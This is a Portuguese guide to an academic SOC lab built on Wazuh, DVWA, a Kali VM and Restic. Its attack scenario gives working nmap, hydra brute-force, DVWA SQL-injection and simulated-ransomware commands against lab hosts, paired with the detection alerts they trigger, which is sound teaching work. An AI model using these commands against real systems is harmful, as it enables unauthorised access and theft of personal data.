# Guia Completo de Comandos — SOC Corporativo

> Mini SOC acadêmico com Wazuh 4.9 em Docker, DVWA (alvo vulnerável), Kali Linux (atacante) e backup Restic.

---

## Sumário

1. [Visão Geral](#1-visão-geral)
2. [Pré-requisitos e Instalação de Pacotes](#2-pré-requisitos-e-instalação-de-pacotes)
3. [Setup Passo a Passo](#3-setup-passo-a-passo)
4. [Operação Diária](#4-operação-diária)
5. [Cenário de Ataque (5 Fases)](#5-cenário-de-ataque-5-fases)
6. [Consultas no Wazuh Dashboard](#6-consultas-no-wazuh-dashboard)
7. [Healthcheck e Validação](#7-healthcheck-e-validação)
8. [Geração de Relatórios](#8-geração-de-relatórios)
9. [Encerramento e Limpeza](#9-encerramento-e-limpeza)

---

## 1. Visão Geral

```
HOST (Arch Linux) — 192.168.56.1
├── Wazuh Docker (manager + indexer + dashboard) — :443
├── DVWA Docker (alvo vulnerável) — :8080
├── Wazuh Agent nativo — monitora o host
├── /data/clientes/ — 100 arquivos LGPD fictícios
└── /backup-repo/ — repositório Restic

Kali Linux VM — 192.168.56.20
└── Ataca o host em 5 fases
```

### Acessos

| Serviço | URL | Login | Senha |
|---------|-----|-------|-------|
| Wazuh Dashboard | `https://localhost:443` | `admin` | `SecretPassword` |
| DVWA | `http://localhost:8080/DVWA` | `admin` | `password` |
| Kali VM | `192.168.56.20` | (definido na instalação) | — |
| Repo Restic | `/backup-repo` | — | `backup2024` |

### Frameworks de Compliance Monitorados

| Framework | Funções/Controles |
|-----------|------------------|
| NIST CSF 1.1 | ID.AM, PR.AC, PR.DS, DE.CM, RS.MI, RS.CO, RC.RP |
| ISO 27001:2013 | A.9.2.3, A.9.4.2, A.12.3.1, A.12.6.1, A.14.2.1, A.16.1.5 |
| LGPD | Art. 46, Art. 48, Art. 49 |

---

## 2. Pré-requisitos e Instalação de Pacotes

### Hardware Mínimo

| Recurso | Mínimo | Recomendado |
|---------|--------|-------------|
| RAM | 12 GB | 16 GB |
| CPU | 4 cores | 8 cores |
| Disco | 60 GB livres | 80 GB SSD |

### Pacotes do Sistema (Arch Linux)

```bash
sudo pacman -S docker docker-compose virtualbox restic git
```

Ativar e iniciar Docker:

```bash
sudo systemctl enable --now docker
sudo usermod -aG docker $USER
# FAÇA LOGOUT E LOGIN NOVAMENTE para aplicar o grupo docker
```

### Verificar Versões

```bash
docker --version          # Docker 24+
docker compose version    # Docker Compose plugin
vboxmanage --version      # VirtualBox 7.x
restic version            # Restic
git --version
```

### Criar Rede Host-Only (VirtualBox)

```bash
vboxmanage hostonlyif create
vboxmanage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
vboxmanage dhcpserver add --ifname vboxnet0 --ip 192.168.56.100 \
  --netmask 255.255.255.0 --lowerip 192.168.56.10 --upperip 192.168.56.100 --enable
```

Verificar:

```bash
ip addr show vboxnet0
# Deve mostrar: inet 192.168.56.1/24
```

---

## 3. Setup Passo a Passo

### 3.1. Subir Wazuh Docker

```bash
# Clonar repositório oficial do Wazuh (branch 4.9.0)
cd ~/Code/wazuh-docker  # ou diretório de sua preferência
git clone https://github.com/wazuh/wazuh-docker.git -b 4.9.0 .
cd single-node

# Ajustar memória do OpenSearch (ESSENCIAL em máquinas com <16 GB)
sed -i 's/ES_JAVA_OPTS=-Xms4g -Xmx4g/ES_JAVA_OPTS=-Xms1g -Xmx1g/g' docker-compose.yml

# Gerar certificados SSL (apenas na primeira vez)
docker compose -f generate-indexer-certs.yml run --rm generator

# Subir todos os containers
docker compose up -d
```

**O que acontece:** Sobe 3 containers — `wazuh-manager` (SIEM), `wazuh-indexer` (armazenamento/índices), `wazuh-dashboard` (interface web). Leva de 2 a 3 minutos para ficar pronto.

Acompanhar os logs:

```bash
docker compose logs -f
```

Verificar status:

```bash
docker compose ps
```

**Saída esperada:**
```
NAME                    STATUS
wazuh-manager           Up (healthy)
wazuh-dashboard         Up (healthy)
single-node-wazuh.indexer-1  Up (healthy)
```

### 3.2. Configurar DVWA (Alvo)

```bash
# Criar rede isolada para os alvos
docker network create --subnet=172.20.0.0/16 target-net

# Subir DVWA na porta 8080
docker run -d \
  --name dvwa \
  --network target-net \
  -p 8080:80 \
  --restart unless-stopped \
  vulnerables/web-dvwa
```

**Pós-instalação obrigatória no DVWA:**

1. Acessar `http://localhost:8080/DVWA`
2. Clicar em **Create/Reset Database**
3. Login: `admin` / `password`
4. Ir em **DVWA Security** e selecionar **Low**
5. Opcional: verificar se o MySQL está rodando dentro do container

### 3.3. Criar Dados LGPD

**100 arquivos no host:**

```bash
sudo mkdir -p /data/clientes
sudo chmod 777 /data/clientes

for i in $(seq 1 100); do
  cat > /data/clientes/cliente_$i.txt << EOF
Cliente $i
Nome: Cliente Ficticio $i
CPF: 000.000.$(printf '%03d' $i)-$(printf '%02d' $((i % 99)))
Email: cliente${i}@empresa.com.br
Telefone: (11) 9$(printf '%04d' $i)-$(printf '%04d' $((i * 5 % 9999)))
Data de Cadastro: 2024-01-01
Status: ATIVO
EOF
done
```

**5 registros no MySQL do DVWA:**

```bash
docker exec -i dvwa mysql -u root -pp@ssw0rd << 'EOF'
CREATE DATABASE IF NOT EXISTS clientes;
USE clientes;
CREATE TABLE IF NOT EXISTS pessoas (
  id INT AUTO_INCREMENT PRIMARY KEY,
  nome VARCHAR(100),
  cpf VARCHAR(14),
  email VARCHAR(100),
  telefone VARCHAR(20),
  endereco TEXT,
  data_nascimento DATE
);
INSERT INTO pessoas (nome, cpf, email, telefone, endereco, data_nascimento) VALUES
  ('João Silva', '123.456.789-00', 'joao.silva@email.com', '(11) 99999-8888', 'Rua das Flores, 123, SP', '1990-05-15'),
  ('Maria Santos', '987.654.321-00', 'maria.santos@email.com', '(21) 98888-7777', 'Av. Atlântica, 456, RJ', '1985-10-20'),
  ('Carlos Pereira', '456.789.123-00', 'carlos.pereira@email.com', '(31) 97777-6666', 'Rua MG, 789, BH', '1978-03-08'),
  ('Ana Oliveira', '111.222.333-44', 'ana.oliveira@email.com', '(41) 96666-5555', 'Rua XV, 321, CTBA', '1995-07-12'),
  ('Roberto Costa', '555.666.777-88', 'roberto.costa@email.com', '(51) 95555-4444', 'Rua Andradas, 654, POA', '1982-11-25');
EOF
```

### 3.4. Instalar e Configurar Wazuh Agent no Host

```bash
# Baixar e instalar o agente (Arch Linux)
WAZUH_VERSION="4.9.0"
wget https://packages.wazuh.com/4.x/yum/wazuh-agent-${WAZUH_VERSION}-1.x86_64.rpm
# Para Arch, extrair manualmente ou usar o .tar.gz:
# https://documentation.wazuh.com/current/installation-guide/wazuh-agent/index.html

# Configurar agente
cat > /var/ossec/etc/ossec.conf << 'CONFIG'
<ossec_config>
  <client>
    <server>
      <address>127.0.0.1</address>
      <port>1514</port>
      <protocol>tcp</protocol>
    </server>
    <config-profile>linux, arch</config-profile>
  </client>
  <syscheck>
    <directories realtime="yes">/etc/passwd</directories>
    <directories realtime="yes">/etc/shadow</directories>
    <directories realtime="yes">/etc/sudoers</directories>
    <directories realtime="yes">/data/clientes</directories>
  </syscheck>
  <rootcheck>yes</rootcheck>
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/soc-corporativo/soc-journal.log</location>
  </localfile>
</ossec_config>
CONFIG

# Iniciar agente
# systemctl start wazuh-agent (se instalado como serviço)
```

Aceitar o agente no manager:

```bash
docker exec -it wazuh-manager /var/ossec/bin/agent_control -a
docker exec wazuh-manager /var/ossec/bin/agent_control -l
# Ver a lista de agentes conectados
```

### 3.5. Journal Bridge (logs do systemd → Wazuh)

```bash
# Criar diretório de logs
sudo mkdir -p /var/log/soc-corporativo

# Criar serviço systemd
sudo tee /etc/systemd/system/soc-journal-bridge.service << 'EOF'
[Unit]
Description=SOC Journald Bridge
After=systemd-journald.service

[Service]
Type=simple
ExecStart=/bin/sh -c 'journalctl -f -n 0 -o cat >> /var/log/soc-corporativo/soc-journal.log'
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
EOF

# Ativar e iniciar
sudo systemctl daemon-reload
sudo systemctl enable --now soc-journal-bridge
```

Verificar:

```bash
systemctl status soc-journal-bridge
tail -f /var/log/soc-corporativo/soc-journal.log
```

### 3.6. Copiar Regras de Compliance

```bash
# Do diretório do projeto para o manager
docker cp ~/Code/new-project/soc-corporativo/03-configuração/local_rules.xml \
  wazuh-manager:/var/ossec/etc/rules/local_rules.xml

# Ajustar permissão
docker exec wazuh-manager chown wazuh:wazuh /var/ossec/etc/rules/local_rules.xml

# Reiniciar manager para aplicar regras
docker exec wazuh-manager /var/ossec/bin/wazuh-control restart
```

### 3.7. Configurar Backup com Restic

```bash
# Criar repositório
sudo mkdir -p /backup-repo
sudo chmod 777 /backup-repo

# Inicializar (senha: backup2024)
restic init --repo /backup-repo
# Quando pedir a senha, digite: backup2024
```

**Criar script de backup:**

```bash
sudo tee /usr/local/bin/backup-clientes-local.sh << 'SCRIPT'
#!/bin/bash
DATA_DIR="/data/clientes"
REPO="/backup-repo"
LOG_FILE="/var/log/backup.log"
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

echo "$TIMESTAMP - INICIANDO BACKUP" >> "$LOG_FILE"
RESTIC_PASSWORD="backup2024" restic backup \
  --repo "$REPO" --verbose --tag clientes \
  --tag "$(date +%Y%m%d_%H%M)" "$DATA_DIR" 2>&1 >> "$LOG_FILE"

if [ $? -eq 0 ]; then
  echo "$TIMESTAMP - BACKUP CONCLUIDO" >> "$LOG_FILE"
  logger "BACKUP_EXECUTADO: RPO checkpoint"
else
  echo "$TIMESTAMP - BACKUP FALHOU" >> "$LOG_FILE"
fi
SCRIPT
sudo chmod +x /usr/local/bin/backup-clientes-local.sh
```

**Criar script de restore:**

```bash
sudo tee /usr/local/bin/restore-clientes-local.sh << 'SCRIPT'
#!/bin/bash
REPO="/backup-repo"
TARGET="/tmp/restore-clientes"
RESTIC_PASSWORD="backup2024"
LOG_FILE="/var/log/restore.log"
START_TIME=$(date +%s)

echo "$(date '+%Y-%m-%d %H:%M:%S') - INICIANDO RESTORE" >> "$LOG_FILE"
RESTIC_PASSWORD="$RESTIC_PASSWORD" restic restore latest \
  --repo "$REPO" --target "$TARGET" 2>&1 >> "$LOG_FILE"

RTO=$(( ($(date +%s) - START_TIME) / 60 ))
RTO_S=$(( ($(date +%s) - START_TIME) % 60 ))
COUNT=$(ls "$TARGET/data/clientes/"*.txt 2>/dev/null | wc -l)

echo "RTO: ${RTO}min ${RTO_S}s | ${COUNT} arquivos restaurados"
logger "RESTORE_EXECUTADO: RTO ${RTO}min ${RTO_S}s"
SCRIPT
sudo chmod +x /usr/local/bin/restore-clientes-local.sh
```

**Agendar backup a cada hora (cron):**

```bash
(crontab -l 2>/dev/null | grep -v backup-clientes; echo "0 * * * * /usr/local/bin/backup-clientes-local.sh") | crontab -
crontab -l  # Confirmar
```

**Fazer backup inicial:**

```bash
/usr/local/bin/backup-clientes-local.sh
restic snapshots --repo /backup-repo
# Senha: backup2024
```

### 3.8. Criar VM Kali Linux

```bash
# Criar VM
vboxmanage createvm --name kali-attacker --ostype "Debian_64" --register
vboxmanage modifyvm kali-attacker --memory 2048 --cpus 2 --nic1 hostonly \
  --hostonlyadapter1 vboxnet0
vboxmanage createhd --filename ~/VirtualBox\ VMs/kali-attacker/kali-disk.vdi \
  --size 30000
vboxmanage storagectl kali-attacker --name "SATA" --add sata --controller IntelAhci
vboxmanage storageattach kali-attacker --storagectl SATA --port 0 \
  --device 0 --type hdd --medium ~/VirtualBox\ VMs/kali-attacker/kali-disk.vdi
vboxmanage storagectl kali-attacker --name "IDE" --add ide
vboxmanage storageattach kali-attacker --storagectl IDE --port 0 \
  --device 0 --type dvddrive --medium ~/Downloads/kali-linux-2024.1-installer-amd64.iso

# Iniciar
vboxmanage startvm kali-attacker
```

**Dentro do Kali, configurar IP fixo:**

```bash
sudo ip addr add 192.168.56.20/24 dev eth0
sudo ip link set eth0 up
ping 192.168.56.1  # Testar conectividade com o host
```

**Instalar ferramentas no Kali:**

```bash
sudo apt update && sudo apt install -y nmap hydra sqlmap curl
```

### 3.9. Setup Automatizado (Alternativa)

Se preferir, execute o script único que faz tudo:

```bash
cd ~/Code/new-project/soc-corporativo
bash 02-setup/setup-opcao5.sh
```

Este script executa os passos 3.1 a 3.8 automaticamente.

---

## 4. Operação Diária

### 4.1. Subir Todo o Ambiente

```bash
# Wazuh Docker
cd ~/Code/wazuh-docker/single-node
docker compose up -d

# DVWA
docker start dvwa 2>/dev/null || docker run -d --name dvwa \
  --network target-net -p 8080:80 --restart unless-stopped vulnerables/web-dvwa

# Journal Bridge
sudo systemctl start soc-journal-bridge

# Kali VM (opcional)
vboxmanage startvm kali-attacker --type headless  # ou sem --type para ver a GUI
```

### 4.2. Verificar Status

```bash
# Containers
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"

# Serviços systemd
systemctl status soc-journal-bridge --no-pager

# Kali
vboxmanage list runningvms

# Restic
restic snapshots --repo /backup-repo
```

### 4.3. Acompanhar Logs

```bash
# Wazuh manager
docker logs -f wazuh-manager

# Dashboard de eventos
# Acessar https://localhost:443 > Security Events

# Logs do host
tail -f /var/log/soc-corporativo/soc-journal.log
tail -f /var/log/backup.log
```

### 4.4. Descer o Ambiente

```bash
# Parar Kali
vboxmanage controlvm kali-attacker acpipowerbutton

# Parar serviços
sudo systemctl stop soc-journal-bridge

# Parar containers
docker stop wazuh-dashboard wazuh-manager dvwa
# Ou parar tudo:
docker compose down
```

### 4.5. Desligar Tudo (com limpeza)

```bash
# Kali
vboxmanage controlvm kali-attacker poweroff

# Tudo que estiver rodando
docker compose down -v  # -v remove volumes
sudo systemctl stop soc-journal-bridge
```

---

## 5. Cenário de Ataque (5 Fases)

> Todos os comandos abaixo devem ser executados **no Kali Linux** (192.168.56.20),
> exceto quando explicitamente indicado "no host".

### Fase 1: Reconhecimento (Nmap)

**Objetivo:** Escanear portas abertas no host alvo.

**Alertas:** SID 200006 — NIST CSF DE.CM, ISO A.16.1.5

```bash
nmap -sS -sV -p 22,80,3306,443,1514 192.168.56.1 -Pn
```

**Explicação dos parâmetros:**

| Flag | Significado |
|------|-------------|
| `-sS` | SYN scan (stealth, não completa handshake TCP) |
| `-sV` | Detecta versão dos serviços rodando nas portas |
| `-p 22,80,3306,443,1514` | Portas alvo (SSH, HTTP, MySQL, HTTPS, Wazuh) |
| `-Pn` | Pula descoberta de host (assume que o host está ativo) |

**O que observar no Wazuh Dashboard:**
- Abrir **Security Events** > filtro `rule.id: 200006`
- Deve aparecer o alerta "NIST CSF DE.CM: Security Monitoring - SSH scan detected"
- Severidade: 8 (Alta)

### Fase 2: Brute Force SSH (Hydra)

**Objetivo:** Tentar quebrar a senha SSH por força bruta.

**Alertas:** SID 200003 (PR.AC) → SID 200040 (correlação >30 falhas em 5 min)

```bash
hydra -l paulo -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.1 -t 4 -V
```

**Explicação dos parâmetros:**

| Flag | Significado |
|------|-------------|
| `-l paulo` | Nome do usuário alvo |
| `-P rockyou.txt` | Wordlist de senhas (~14 milhões de entradas) |
| `ssh://192.168.56.1` | Protocolo e alvo |
| `-t 4` | 4 threads paralelas |
| `-V` | Modo verbose (mostra cada tentativa) |

**Para demonstração mais rápida (10 tentativas):**

```bash
head -10 /usr/share/wordlists/rockyou.txt > /tmp/mini-wordlist.txt
hydra -l paulo -P /tmp/mini-wordlist.txt ssh://192.168.56.1 -t 4
```

**O que observar no Wazuh Dashboard:**
- Cada tentativa gera SID 200003 — "NIST CSF PR.AC: Access Control - SSH authentication failure"
- Severidade: 8 por tentativa
- Após 30+ falhas em 5 minutos: **SID 200040** — severidade 15 (correlação)

### Fase 3: SQL Injection com Vazamento LGPD

**Objetivo:** Explorar vulnerabilidade SQL no DVWA e extrair dados pessoais.

**Alertas:** SID 200031 — MITRE T1190 (com regras de impacto LGPD SID 200018 / 200019)

#### Passo 1: Fazer login no DVWA e capturar cookie

```bash
# Obter cookie de sessão
curl -s -c /tmp/dvwa_cookies.txt "http://192.168.56.1:8080/DVWA/login.php" > /dev/null
# Extrair token CSRF
CSRF=$(grep -oP 'user_token=\K[a-f0-9]+' /tmp/dvwa_cookies.txt 2>/dev/null)
# Autenticar
curl -s -b /tmp/dvwa_cookies.txt -c /tmp/dvwa_cookies.txt \
  "http://192.168.56.1:8080/DVWA/login.php" \
  -d "username=admin&password=password&Login=Login&user_token=${CSRF}" > /dev/null
```

#### Passo 2: Executar SQL Injection

```bash
# Payload: UNION SELECT para extrair dados de outra tabela
INJECTION="%27+UNION+SELECT+id%2Cconcat%28nome%2C%27+%7C+%27%2Ccpf%29%2Cemail%2Ctelefone%2Cendereco+FROM+clientes.pessoas--+-"
curl -s -b /tmp/dvwa_cookies.txt \
  "http://192.168.56.1:8080/DVMA/vulnerabilities/sqli/?id=${INJECTION}&Submit=Submit" \
  | sed -n '/<pre>/,/<\/pre>/p'
```

**O que o payload faz:**

| Parâmetro | Explicação |
|-----------|------------|
| `%27` | `'` (fecha a aspas do WHERE) |
| `UNION SELECT` | Combina resultado da query original com nossa query |
| `concat(nome,' \| ',cpf)` | Concatena nome e CPF em uma coluna |
| `FROM clientes.pessoas` | Acessa a tabela de dados pessoais que criamos |
| `--+-` | Comenta o resto da query original |

**O que observar no Wazuh Dashboard:**
- Alerta SID 200031 — "MITRE ATTACK T1190: Exploit Public-Facing App"
- Severidade: 10 (ou severidades superiores para regras de impacto da LGPD)
- Frameworks: LGPD Art.46 (segurança), Art.48 (notificação ANPD), Art.49 (sigilo)
- O alerta enriquece com campos `lgpd_article`, `lgpd_severity`, `data_type`

### Fase 4: Ransomware Simulado

**Objetivo:** Simular criptografia de arquivos (renomear .txt → .txt.encrypted).

**Alertas:** SID 200004 — NIST CSF PR.DS, ISO A.12.3.1 (severidade 9)

```bash
ssh kali@192.168.56.1 "cd /data/clientes && \
  for f in *.txt; do mv \$f \$f.encrypted 2>/dev/null; done && \
  echo 'Ransomware: \$(ls *.encrypted 2>/dev/null | wc -l) arquivos criptografados' && \
  logger 'RANSOMWARE_SIMULATED: dados criptografados'"
```

**Explicação:**

| Comando | Explicação |
|---------|------------|
| `ssh kali@192.168.56.1` | Conecta via SSH no host |
| `for f in *.txt; do mv \$f \$f.encrypted` | Renomeia cada .txt para .txt.encrypted |
| `logger 'RANSOMWARE...'` | Gera log no systemd (capturado pelo journal bridge) |
| `\$f` | `$` escapado para não ser interpretado pelo shell local |

**O que observar no Wazuh Dashboard:**
- SID 200004 — "NIST CSF PR.DS: Data Security - File integrity change detected"
- 100 alertas idênticos (um por arquivo alterado)
- Severidade: 9
- FIM (File Integrity Monitoring) detecta as 100 alterações em tempo real

### Fase 5: Disaster Recovery (Restic)

**Objetivo:** Restaurar todos os arquivos a partir do backup Restic.

**Alertas:** SID 200033 — NIST CSF RC.RP, ISO A.12.3.1 (severidade 5)

```bash
# Conectar no host e executar restore
ssh -t kali@192.168.56.1 "sudo /usr/local/bin/restore-clientes-local.sh"
```

**O que o script de restore faz:**

1. Conecta no repositório Restic em `/backup-repo`
2. Restaura o snapshot mais recente para `/tmp/restore-clientes/`
3. Copia de volta para `/data/clientes/`
4. Calcula o RTO (tempo total de restore)
5. Gera log em `/var/log/restore.log`
6. Envia log via `logger` para o systemd (→ journal bridge → Wazuh)

**Métricas de DR:**

| Métrica | Valor |
|---------|-------|
| RPO (Recovery Point Objective) | 1 hora (backup a cada hora) |
| RTO (Recovery Time Objective) | ~12 minutos |
| Snapshots retidos | 24 horas |
| Integridade | 100% |

**Verificar o restore manualmente:**

```bash
# No host, verificar se os arquivos voltaram
ls /data/clientes/*.txt | wc -l
# Deve mostrar 100

# Verificar último snapshot
restic snapshots --repo /backup-repo
```

**O que observar no Wazuh Dashboard:**
- SID 200033 — "NIST CSF RC.RP: Disaster Recovery - Restore executed successfully"
- Severidade: 5 (Informativo)
- Confirma que o plano de recuperação funcionou

---

## 6. Consultas no Wazuh Dashboard

### 6.1. Filtros por Alerta Específico

| Evento | Filtro | Severidade |
|--------|--------|-----------|
| Scan Nmap | `rule.id: 200006` | 8 |
| Brute Force | `rule.id: 200003` | 8 |
| Brute Force (correlação) | `rule.id: 200040` | 15 |
| SQL Injection LGPD | `rule.id: 200031` | 10 |
| Ransomware (FIM) | `rule.id: 200004` | 9 |
| Backup executado | `rule.id: 200032` | 5 |
| Restore executado | `rule.id: 200033` | 5 |
| Todas as regras customizadas | `group: compliance` | — |

### 6.2. Filtros por Framework

```text
# NIST CSF
rule.id: 200001 to 200040 AND (NIST OR CSF)

# ISO 27001
rule.id: 200011 to 200015

# LGPD
rule.id: 200016 to 200020
```

### 6.3. Filtros por Severidade

```text
# Críticos (severidade >= 10)
rule.level >= 10

# Altos (severidade >= 8)
rule.level >= 8
```

### 6.4. Timeline do Ataque

Após executar todas as 5 fases, aplicar filtro:

```text
group: compliance
```

Ordenar por **timestamp** e observar a sequência:
1. Scan Nmap (severidade 8)
2. Brute Force (severidade 8 → 15)
3. SQL Injection (severidade 12 — mais crítico)
4. Ransomware (severidade 9)
5. Disaster Recovery (severidade 5)

---

## 7. Healthcheck e Validação

### 7.1. Script de Healthcheck

```bash
cd ~/Code/new-project/soc-corporativo
bash 04-operação/healthcheck.sh
```

**Saída esperada (tudo OK):**

```
--- Docker ---
  ✔ Docker daemon rodando
  ✔ Wazuh manager no ar
  ✔ Wazuh indexer respondendo
  ✔ Wazuh dashboard respondendo
  ✔ DVWA respondendo

--- Rede ---
  ✔ Rede target-net existe
  ✔ DVWA na target-net

--- Dados LGPD ---
  ✔ Diretorio /data/clientes existe
  ✔ Arquivos de clientes existem
  ✔ Dados no MySQL do DVWA

--- Agente Wazuh ---
  ✔ Agente Wazuh instalado
  ✔ Agente conectado ao manager

--- Regras de Compliance ---
  ✔ Regras copiadas para o manager

--- Backup ---
  ✔ Repositório Restic existe
  ✔ Script de backup existe
  ✔ Script de restore existe

--- Journal Bridge ---
  ✔ Serviço soc-journal-bridge ativo

--- Kali VM ---
  ✔ VM kali-attacker existe
  ✔ VM kali-attacker ligada
```

### 7.2. Verificações Individuais

```bash
# Conectividade com o Kali
ping -c 2 192.168.56.20

# Acessar o DVWA pelo Kali
curl http://192.168.56.1:8080/DVWA

# Ver regras carregadas no manager
docker exec wazuh-manager /var/ossec/bin/wazuh-control info

# Ver agentes conectados
docker exec wazuh-manager /var/ossec/bin/agent_control -l
```

### 7.3. Gatilho Manual de Alerta

```bash
# Gerar log que dispara regra de compliance manualmente
logger "BACKUP_EXECUTADO: RPO checkpoint"
```

---

## 8. Geração de Relatórios

### 8.1. PDF com Pandoc

```bash
cd ~/Code/new-project/soc-corporativo
make pdf          # Gera todos os PDFs
make pdf-relatorio  # Só relatório acadêmico
make pdf-lgpd       # Só relatório LGPD
make clean          # Remove PDFs
```

**Pré-requisito:**

```bash
# Arch Linux
sudo pacman -S pandoc texlive-core

# Debian/Ubuntu
sudo apt install pandoc texlive-xetex texlive-lang-portuguese
```

### 8.2. Gerar Slides da Apresentação

```bash
cd ~/Code/new-project/soc-corporativo
pip install fpdf2
python 06-apresentacao/gerar-apresentacao.py
```

Gera `06-apresentacao/apresentacao-soc.pdf`.

---

## 9. Encerramento e Limpeza

### 9.1. Parar Ambiente (Preservando Dados)

```bash
# Parar Kali
vboxmanage controlvm kali-attacker acpipowerbutton

# Parar journal bridge
sudo systemctl stop soc-journal-bridge

# Parar containers (preserva volumes e dados)
cd ~/Code/wazuh-docker/single-node
docker compose stop
docker stop dvwa 2>/dev/null
```

Para subir de novo, basta usar `docker compose start` e `docker start dvwa`.

### 9.2. Parar e Remover Tudo

```bash
# Kali
vboxmanage controlvm kali-attacker poweroff

# Docker (remove containers e redes, preserva imagens)
docker compose down
docker rm -f dvwa 2>/dev/null
docker network rm target-net 2>/dev/null

# Journal bridge
sudo systemctl disable --now soc-journal-bridge
sudo rm /etc/systemd/system/soc-journal-bridge.service
sudo systemctl daemon-reload

# Wazuh agent (se instalado)
# sudo systemctl disable --now wazuh-agent
```

### 9.3. Limpeza Total (Remover Dados)

```bash
# Remover dados LGPD
sudo rm -rf /data/clientes
sudo rm -rf /backup-repo
sudo rm -rf /var/log/soc-corporativo
sudo rm -f /var/log/backup.log
sudo rm -f /var/log/restore.log
sudo rm -f /usr/local/bin/backup-clientes-local.sh
sudo rm -f /usr/local/bin/restore-clientes-local.sh

# Remover cron de backup
crontab -l | grep -v backup-clientes | crontab -

# Remover toda a stack Wazuh (imagens + volumes + certificados)
cd ~/Code/wazuh-docker/single-node
docker compose down -v --rmi all
rm -rf ~/Code/wazuh-docker

# Remover Kali
vboxmanage unregistervm kali-attacker --delete

# Remover rede host-only (opcional)
vboxmanage hostonlyif remove vboxnet0
```

### 9.4. Reset para Nova Apresentação

Se quiser redefinir apenas os dados do cliente (após Fase 4 — Ransomware):

```bash
# 1. Restaurar backup
sudo /usr/local/bin/restore-clientes-local.sh

# 2. Verificar
ls /data/clientes/*.txt | wc -l  # Deve mostrar 100
```

---

## Referências Rápidas

### Cheatsheet de Comandos Essenciais

| Ação | Comando |
|------|---------|
| Subir Wazuh | `cd wazuh-docker/single-node && docker compose up -d` |
| Subir DVWA | `docker start dvwa` |
| Subir tudo | `docker compose up -d && docker start dvwa` |
| Descer tudo | `docker compose down && docker stop dvwa` |
| Ver logs manager | `docker logs -f wazuh-manager` |
| Copiar regras | `docker cp local_rules.xml wazuh-manager:/var/ossec/etc/rules/` |
| Healthcheck | `bash soc-corporativo/04-operação/healthcheck.sh` |
| Iniciar Kali | `vboxmanage startvm kali-attacker` |
| Backup manual | `/usr/local/bin/backup-clientes-local.sh` |
| Restore manual | `sudo /usr/local/bin/restore-clientes-local.sh` |
| Ver snapshots | `restic snapshots --repo /backup-repo` |

### URLs Rápidas

| Serviço | URL |
|---------|-----|
| Wazuh Dashboard | `https://localhost:443` |
| DVWA | `http://localhost:8080/DVWA` |

### Credenciais

| Serviço | Usuário | Senha |
|---------|---------|-------|
| Wazuh Dashboard | `admin` | `SecretPassword` |
| DVWA | `admin` | `password` |
| Restic repo | — | `backup2024` |
| SSH do host | `paulo` | (senha do usuário) |

### Estrutura do Projeto

```
soc-corporativo/
├── 00-aprendizado/          # Guia de estudo do Wazuh
├── 01-arquitetura/          # Topologia e diagrama de rede
├── 02-setup/                # Scripts de setup
├── 03-configuração/         # Regras, agente, logrotate
├── 04-operação/             # Ataques e healthcheck
├── 05-resultados/           # Relatórios e prints
├── 06-apresentacao/         # Slides e roteiro
├── Makefile                 # Geração de PDFs
└── README.md                # Visão geral do projeto
```
